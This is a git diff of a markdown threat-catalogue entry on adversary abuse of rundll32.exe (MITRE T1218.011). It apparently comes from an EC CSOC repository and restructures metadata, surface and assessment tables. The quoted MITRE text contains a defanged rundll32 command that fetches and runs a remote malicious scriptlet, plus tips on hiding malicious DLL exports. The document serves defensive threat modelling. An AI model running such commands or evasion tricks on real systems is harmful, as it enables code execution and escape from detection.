@@ -1,14 +1,15 @@
 # DLL Execution over Rundll32
 
 ## Metadata
-
-- **UUID**: `f3a392f7-3268-4c54-8bfa-8117b784f520`
-- **Schema**: `threat::1.0`
-- **Version**: `2`
-- **Created**: `2023-07-25`
-- **Modified**: `2025-10-01`
-- **TLP**: clear (`TLP:CLEAR`)
-- **Organisation**: EC DIGIT CSOC (`56b0a0f0-b0bc-47d9-bb46-02f80ae2065a`)
+| Field | Value |
+| --- | --- |
+| UUID | `f3a392f7-3268-4c54-8bfa-8117b784f520` |
+| Schema | `threat::1.0` |
+| Version | `2` |
+| Created | `2023-07-25` |
+| Modified | `2025-10-01` |
+| TLP | clear (`TLP:CLEAR`) |
+| Organisation | EC DIGIT CSOC (`56b0a0f0-b0bc-47d9-bb46-02f80ae2065a`) |
 
 ## References
 ### Public
@@ -35,20 +36,29 @@ or dump LSASS process memory to obtain credentials.
 **Severe** - A Severe priority incident is likely to result in a significant impact to public health or safety, national security, economic security, foreign relations, or civil liberties.
 
 ## Terrain
-> **Adversary must have enough privileges on the Windows host to bypass application
+Adversary must have enough privileges on the Windows host to bypass application
 control solutions via the rundll32.exe process. Natively, rundll32.exe will load
 DLLs and is a great example of a Living off the Land Binary.
 
-Domains: Enterprise, Public Cloud, Private Cloud
-Targets: Web Application Servers, Virtual Machines, Laptop, Workstations
-Platforms: Windows**
+## Surface
+> **Windows**
+> Microsoft Windows operating systems (all versions)
+
+> **Web Servers**
+> HTTP servers and reverse proxies
+
+> **Azure::Compute::Virtual Machines**
+> Azure Virtual Machines
+
+> **Windows::Desktop**
+> Microsoft Windows desktop editions
 
 ## Threat Assessment
 | Dimension | Assessment | Description |
 | --- | --- | --- |
 | Severity | Moderate incident | A cyber attack on a small organisation, or which poses a considerable risk to a medium-sized organisation, or preliminary indications of cyber activity against a large organisation or the government. |
-| Impact | Data Breach; Lose Capabilities | - |
-| Leverage | Modify privileges; Elevation of privilege; Information Disclosure | - |
+| Impact | Data Breach<br>Lose Capabilities | Non-public information has been accessed from the outside, and successfully extracted.<br>Vector execution will remove key functions to the organization, which will not be easily circumvented. Most day-to-day is heavily impaired, but processes can reorganize at a loss. |
+| Leverage | Modify privileges<br>Elevation of privilege<br>Information Disclosure | Modify privileges or permissions<br>Capacity to augment leverage over the target system by upgrading the compromised access rights<br>Threat action intending to read a file that one was not granted access to, or to read data in transit. |
 | Viability | Likely | Probable (probably) - 55-80% |
 | Kill Chain | Exploitation | Techniques to exploit vulnerabilities in systems that may, amongst others, result in code execution. |
 
@@ -73,3 +83,13 @@ Platforms: Windows**
 | Technique | Name | Description |
 | --- | --- | --- |
 | `T1218.011` | [System Binary Proxy Execution: Rundll32](https://attack.mitre.org/techniques/T1218/011) | Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).  Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute.(Citation: Trend Micro CPL) For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002) can be proxied through Rundll32.exe.  Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)  Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).  Additionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) |
+
+## Chaining
+```mermaid
+flowchart LR
+subgraph "Exploitation"
+f3a392f7_3268_4c54_8bfa_8117b784f520{{"DLL Execution over<br>Rundll32"}}
+4110c951_3120_49fb_b54b_3d3aa896296b{{"MoonTag backdoor"}}
+end
+4110c951_3120_49fb_b54b_3d3aa896296b -->|preceeds| f3a392f7_3268_4c54_8bfa_8117b784f520
+```
